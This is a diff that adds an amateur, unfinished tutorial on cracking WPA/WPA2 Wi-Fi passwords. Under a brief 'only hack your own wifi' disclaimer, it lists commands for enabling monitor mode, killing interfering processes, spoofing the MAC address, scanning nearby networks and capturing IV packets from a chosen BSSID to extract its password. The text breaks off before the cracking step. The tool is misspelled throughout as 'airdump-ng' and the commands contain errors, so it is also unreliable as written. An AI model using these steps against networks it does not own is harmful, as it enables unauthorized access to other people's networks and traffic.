@@ -1,0 +1,47 @@
+
+/////////////////////////////////////
+// a little tutorial on wpa & wpa2 //
+/////////////////////////////////////
+// only hack your own wifi's.      //
+// if you hack a wifi that is'nt   //
+// yours, you can be sentenced for //
+// it                              //
+/////////////////////////////////////
+
+airmon-ng start wlan0
+
+// this command will return pid of all running proccesses that might interfere
+// with the monitor mode.
+// please use the kill command to get rid of all the proccesses
+
+Kill [pid]
+
+#########################
+# optinal section start #
+#########################
+
+//this will change you mac address
+
+ifconfig [Wifi_interface] down
+macchanger -m [insert new mac address]
+ifconfig [Wifi_interface] up
+
+#########################
+#  optinal section end  #
+#########################
+
+
+airdump-ng [Wifi_interface]
+// this will show you all the public info on all the wifi networks
+// that are in range of you.
+// make note of the BSSID and channel of the wifi you are going to hack.
+
+// press "ctrl C" to exit the interface.
+
+airdump-ng -c [insert channel] -w [insert name of the file you are goin to create] --BSSID [inser mac of wifi] --ivs [Wifi_interface]
+
+// this will capture ivs packets  from the specified wifi,
+// we are going to use the file to extract the password for the wifi
+// use airdump-ng --help if you get confused.  
+
+//
